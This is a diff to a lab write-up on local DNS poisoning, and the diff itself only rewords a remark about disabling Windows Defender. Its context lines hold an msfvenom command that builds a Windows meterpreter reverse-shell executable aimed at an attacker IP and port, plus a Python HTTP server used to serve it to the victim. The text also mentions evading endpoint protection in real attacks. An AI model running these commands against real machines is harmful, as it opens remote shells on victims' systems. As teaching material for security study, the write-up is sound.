@@ -26,7 +26,7 @@ This attack was performed on a controlled LAN network. We all know about the DNS
 
 >Creating the payload in the next step and for that we'll be using the msfvenom to create the payload and this payload will be sent to victim's machine via hosting a local server in the attacker server and accessing the server to download the payload in the victim machine(For a simple explanation, the focus over here is Local DNS poisoning, the compromise can be done in many ways
 
-> As this payload can be detected by the default windows defender, the windows defender is turned off(But in real attack the attacker crafts the payload in such a way that the default firewalls can't identify them)
+> 🛈 *Note: Windows Defender was disabled for this simulation. In a real-world scenario, advanced evasion techniques or custom payloads would be required to bypass endpoint protections.*
 
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=[attacker ip]  LPORT=[port] -f exe -o [payload_name] ---> Payload
 python3 -m http.server 9876 ----> to host the local server
